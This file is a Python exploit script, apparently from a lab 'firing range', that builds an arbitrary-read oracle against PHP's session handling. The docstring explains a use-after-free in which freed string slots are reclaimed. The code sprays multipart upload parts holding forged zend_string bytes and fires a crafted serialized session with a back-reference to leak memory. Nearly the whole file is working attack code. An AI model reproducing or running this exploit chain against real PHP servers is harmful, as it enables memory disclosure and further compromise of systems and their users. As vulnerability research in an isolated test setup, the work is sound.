#!/usr/bin/env python3
"""smb_oracle5.py — the marker-reclaim oracle (attempt-7, phpbleed-native).

Producer (75MB bailout) leaves, INTACT across the boundary:
  d = {last=&entries, first/last_dtor=<LEAKED 4096B dtor chunk>,
       entries.used_slots=15, entries.data[i] -> dtor chunk +0x10+16i}
  dtor chunk (leaked, never freed) data[i] = {freed-marker-string-addr, 0x106}

Consumer: multipart with ~190B value parts (class-256 raw buffers reclaim
the freed marker strings' 256-bin slots with OUR bytes) + a 3MB staged
session (ps_read => mmap, never touches d's pages). The nested decode:
  tmp_var -> the LEAKED dtor chunk (used_slots=13) -> appends
  var_push -> entries (used_slots=15) -> appends at data[15]
  R:3 -> var_access(2) -> data[2] -> dtor chunk data[2] =
         {marker-2-string-addr, IS_STRING_EX} -> ZVAL_COPY into k[1]
  flush/encode reads the "string" at marker-2's old address =
         OUR RECLAIMED BYTES: len@+0x10, val@+0x18
  => writeback echoes whatever we forged there = ARBITRARY READ ORACLE.
Self-verifying variant: forge len=16, val="ORACLEWORKS!!!".
"""
import struct
import sys
import time

sys.path.insert(0, "/home/user/php-firing-range/scripts")
import smb_q1_fatal_window as q
import smb_619_state as s
import smb_oracle2 as o2
from smb_oracle import stage, fire_main

BND = b"G"


def part(name, value):
    return (b"--" + BND + b'\r\nContent-Disposition: form-data; name="'
            + name + b'"\r\n\r\n' + value + b"\r\n")


def file_part(name, value, filename=b"a.txt"):
    return (b"--" + BND + b'\r\nContent-Disposition: form-data; name="' + name
            + b'"; filename="' + filename + b'"'
            b"\r\nContent-Type: application/octet-stream\r\n\r\n" + value + b"\r\n")


def forge_string_bytes(data=b"ORACLEWORKS!!!", length=None):
    """Raw value bytes that read as a zend_string body at the slot:
    encode does len = *(slot+0x10), val = slot+0x18."""
    b = bytearray(190)
    struct.pack_into("<Q", b, 0x10, length if length is not None else len(data))
    b[0x18:0x18 + len(data)] = data
    return bytes(b)


def build_body(gsid, n_spray=0, filedata=b"z" * 4096):
    spray = b"".join(part(b"s%d" % i, forge_string_bytes()) for i in range(n_spray))
    body = (part(b"PHPSESSID", gsid.encode()) +
            part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc") +
            spray +
            file_part(b"f", filedata) +
            b"--" + BND + b"--\r\n")
    return body


def main():
    print("=== ORACLE v5: marker-string bin reclaim ===")
    q.docker_exec(q.CT["vuln"], "pkill -f 'php -S 0.0.0.0:8080' || true")
    q.healthy(q.VULN, deadline=15)
    time.sleep(0.5)
    sid = f"o5{int(time.time())}"
    q.stage_producer("vuln", sid)
    st, _ = q.mp_min(q.VULN, sid)
    print(f"producer: {st}")
    d = o2.find_bg()
    print(f"remnant d = {hex(d) if d else None}")
    if not d:
        return 1
    raw = s.read_mem("vuln", d, 0x100)
    # entries.data[2] -> dtor chunk data[2] -> the marker-2 string address
    slot2 = int.from_bytes(raw[0x48 + 16:0x50 + 16], "little")
    chunk2 = s.read_mem("vuln", slot2, 16)
    marker2_addr = int.from_bytes(chunk2[0:8], "little")
    mtype = int.from_bytes(chunk2[8:12], "little")
    print(f"entries.data[2] = {hex(slot2)}; zval = {{0x{marker2_addr:x}, "
          f"0x{mtype:x}}} (the freed marker-2 string)")
    gsid = f"o5c{int(time.time())}"
    stage(gsid, b'k|a:2:{i:0;s:9:"WALKOK1!";i:1;R:3;}pad|s:' + str(3*1024*1024).encode()             + b':"' + b'A' * (3*1024*1024) + b'";')
    first = fire_main(build_body(gsid))
    print(f"consumer: {first}")
    rc, out = q.docker_exec(q.CT["vuln"], f"cat /tmp/sess_{gsid} 2>/dev/null")
    print(f"sess: {out[:250]!r}")
    hit = "ORACLEWORKS!!!" in out
    print(f"*** ORACLE {'LIVE!!!' if hit else 'not yet'} ***")
    return 0 if hit else 1


if __name__ == "__main__":
    sys.exit(main())
